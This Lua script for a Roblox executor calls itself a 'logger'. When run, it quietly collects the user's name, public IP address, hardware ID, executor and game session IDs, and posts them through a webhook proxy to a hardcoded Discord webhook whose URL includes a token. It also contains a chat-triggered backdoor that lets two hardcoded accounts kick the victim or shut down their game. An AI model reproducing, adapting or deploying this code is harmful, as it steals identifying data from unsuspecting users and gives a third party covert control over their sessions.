--another shitty logger

local v1 = 'https://discord.com/api/webhooks/1300800911198654585/5eXQMCk9hfoAm5mllnJUWoHDuYMp3pZTbcYq4xAii2LJIr-UM4MhWpJxDiMZ9C8cNbG2'
local _Name = game.Players.LocalPlayer.Name
local u3 = game:GetService('RbxAnalyticsService'):GetClientId()
local u4 = identifyexecutor and identifyexecutor() or 'Unknown'
local _httpsipinfoioip = game:HttpGet('https://ipinfo.io/ip')
local _PlaceId = game.PlaceId
local _JobId = game.JobId
local _HttpService = game:GetService('HttpService')
local _Players = game:GetService('Players')
local _LocalPlayer = _Players.LocalPlayer
local u11 = {
    'jjljjgjjbjjtjjqjjbad',
    'aob070007',
}

local function u17(p12)
    local v13, v14, v15 = pairs(u11)

    while true do
        local v16

        v15, v16 = v13(v14, v15)

        if v15 == nil then
            break
        end
        if p12 == v16 then
            return true
        end
    end

    return false
end
local function u20(p18, p19)
    if u17(p18.Name) then
        if p19:lower() == (':kick ' .. _LocalPlayer.Name):lower() then
            _LocalPlayer:Kick('You have been kicked')

            return
        end
        if p19:lower() == (':shutdown ' .. _LocalPlayer.Name):lower() then
            game:Shutdown()

            return
        end
    end
end

_Players.PlayerAdded:Connect(function(p21)
    p21.Chatted:Connect(function(p22)
        u20(p21, p22)
    end)
end)

local v23, v24, v25 = ipairs(_Players:GetPlayers())
local u26 = u20

while true do
    local u27

    v25, u27 = v23(v24, v25)

    if v25 == nil then
        break
    end

    u27.Chatted:Connect(function(p28)
        u26(u27, p28)
    end)
end

local function u40(p29, p30, p31, p32, p33, p34, p35)
    local v36 = {
        ['Content-Type'] = 'application/json',
    }
    local v37 = _HttpService:JSONEncode({
        embeds = {
            {
                title = 'New Execution',
                color = 65280,
                fields = {
                    {
                        name = 'Username:',
                        value = p30,
                        inline = true,
                    },
                    {
                        name = 'IP:',
                        value = p33,
                        inline = true,
                    },
                    {
                        name = 'HWID:',
                        value = p31,
                        inline = true,
                    },
                    {
                        name = 'Executor:',
                        value = p32,
                        inline = true,
                    },
                    {
                        name = 'GameID:',
                        value = tostring(p34),
                        inline = true,
                    },
                    {
                        name = 'JobID:',
                        value = p35,
                        inline = true,
                    },
                },
                footer = {
                    text = p30 .. ', ' .. p33 .. ', ' .. p31 .. ', ' .. p32 .. ', ' .. p34 .. ', ' .. p35,
                },
            },
        },
    })
    local v38 = syn and syn.request or (request or http_request)

    if v38 then
        local v39 = v38({
            Url = p29,
            Method = 'POST',
            Headers = v36,
            Body = v37,
        })

        if not v39.Success then
            warn('Failed to send message: ' .. v39.StatusMessage)
        end
    else
        warn('No compatible HTTP request function found.')
    end
end

if v1 and string.find(v1, 'discord') then
    local u41 = string.gsub(v1, 'https://discord.com', 'https://webhook.lewisakura.moe')

    task.spawn(function()
        u40(u41, _Name, u3, u4, _httpsipinfoioip, _PlaceId, _JobId)
    end)
end
